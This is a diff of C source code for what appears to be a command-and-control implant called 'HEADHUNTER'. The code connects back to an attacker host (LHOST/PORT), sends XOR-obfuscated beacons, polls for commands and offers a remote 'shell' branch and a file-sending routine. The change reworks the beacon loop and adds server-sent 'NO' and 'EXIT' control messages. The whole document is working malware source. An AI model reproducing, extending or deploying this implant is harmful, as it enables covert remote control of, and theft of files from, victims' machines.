@@ -20,22 +20,6 @@ char buf[MAXBUF];
 int bufsize;
 int sleeptime = 5;
 
-void* Read(){
-
-	// Initial beacon connection
-	
-	char* beacon = "--HEADHUNTER BEACON--";
-	char* xorbeacon = XOR(beacon, key, strlen(beacon), strlen(key));
-	send(sock, xorbeacon, strlen(beacon), 0);
-
-	while(connection_established == 0){
-		while(bufsize = read(sock, buf, MAXBUF)){
-			;;
-		}
-	}
-	
-}
-
 int sendfile(FILE* fp, int fd, char* key)
 {
         char data[SIZE] = {0};
@@ -62,7 +46,6 @@ int main(void)
 	char* ip = LHOST;
 	int port = PORT;
 	int n = 0;
-	pthread_t read_thread;
 	struct sockaddr_in sa;
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
@@ -75,7 +58,6 @@ int main(void)
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
-	pthread_create(&read_thread, NULL, Read, NULL);
 
 	char* beacon = "--HEADHUNTER BEACON--";
 	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
@@ -83,11 +65,17 @@ int main(void)
 	while (connection_established == 0)
 	{
 		
-		if(strlen(buf) > 0){
-
-			sleep(sleeptime);	
-			send(sock, xorbeacon, strlen(beacon), 0);
-			char* xorbuf = XOR(buf, key, bufsize, keylen);
+		send(sock, xorbeacon, strlen(beacon), 0);
+		n = read(sock, buf, MAXBUF);
+		char* xorbuf = XOR(buf, key, n, keylen);
+		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
+			sleep(sleeptime);
+		}
+		else if(str_starts_with(xorbuf, "--HEADHUNTER EXIT--") == 0){
+		
+			return 0;
+		}
+		else{
 			
 			if(str_starts_with(xorbuf, "shell") == 0)
 			{
@@ -163,15 +151,6 @@ int main(void)
 				free(xornewline);
 		
 			}
-			else if(str_starts_with(xorbuf, "exit\n") == 0){
-
-				char* disconnect = "[+] Hunter agent: OK\n";
-				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
-				write(sock, xordisconnect, strlen(disconnect));
-				free(xordisconnect);
-				pthread_cancel(read_thread);
-				return 0;
-			}
 			else
 			{
 				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
@@ -180,10 +159,6 @@ int main(void)
 			
 			memset(buf, '\0', strlen(buf));
 			free(xorbuf);
-		}
-		else {
-			sleep(sleeptime);
-			send(sock, xorbeacon, strlen(beacon), 0);
 		}
 	}
 
